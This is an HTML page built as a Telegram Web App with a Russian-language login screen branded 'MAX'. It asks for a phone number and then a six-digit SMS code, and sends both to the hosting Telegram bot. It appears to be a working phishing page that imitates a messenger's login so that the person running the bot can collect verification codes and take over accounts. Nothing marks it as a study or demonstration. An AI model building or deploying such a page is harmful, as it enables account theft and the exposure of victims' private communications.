<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAX</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container { width: 100%; max-width: 360px; padding: 24px; }
        .header { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
        .logo { width: 40px; height: 40px; background: #e94560; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; }
        .title { font-size: 20px; font-weight: 600; }
        input { width: 100%; padding: 14px; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; margin-bottom: 12px; outline: none; }
        button { width: 100%; padding: 14px; background: #e94560; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:active { opacity: 0.8; }
        #codeSection { display: none; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">M</div>
            <div class="title">MAX</div>
        </div>
        <div id="phoneSection">
            <input type="tel" id="phone" placeholder="Номер телефона">
            <button onclick="requestCode()">Получить код</button>
        </div>
        <div id="codeSection">
            <div class="subtitle">Код отправлен</div>
            <input type="text" id="code" placeholder="Код из SMS" maxlength="6">
            <button onclick="submitCode()">Войти</button>
        </div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        function requestCode() {
            const phone = document.getElementById('phone').value.trim();
            if (!phone) return;
            tg.sendData(JSON.stringify({action: "request_code", phone}));
            document.getElementById('phoneSection').style.display = 'none';
            document.getElementById('codeSection').style.display = 'block';
        }
        function submitCode() {
            const code = document.getElementById('code').value.trim();
            if (code.length !== 6) return;
            tg.sendData(JSON.stringify({action: "submit_code", code}));
            tg.close();
        }
    </script>
</body>
</html>
